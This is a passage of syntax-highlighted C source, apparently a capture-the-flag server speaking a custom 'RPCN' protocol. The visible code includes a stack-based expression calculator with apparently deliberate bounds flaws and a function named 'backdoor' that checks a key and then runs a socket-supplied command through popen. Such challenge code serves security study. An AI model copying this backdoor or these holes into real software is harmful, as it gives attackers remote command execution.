<span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>top <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        s<span class="token operator">-></span>top<span class="token operator">--</span><span class="token punctuation">;</span>        s<span class="token operator">-></span>pool<span class="token punctuation">[</span>s<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'('</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">')'</span><span class="token punctuation">:</span>            ret<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">deal_data</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> array<span class="token punctuation">,</span> stack<span class="token operator">*</span> opt<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> c <span class="token operator">=</span> opt<span class="token operator">-></span>pool<span class="token punctuation">[</span>opt<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    opt<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> a <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    array<span class="token operator">-></span>top<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> b <span class="token operator">=</span> array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>            array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token 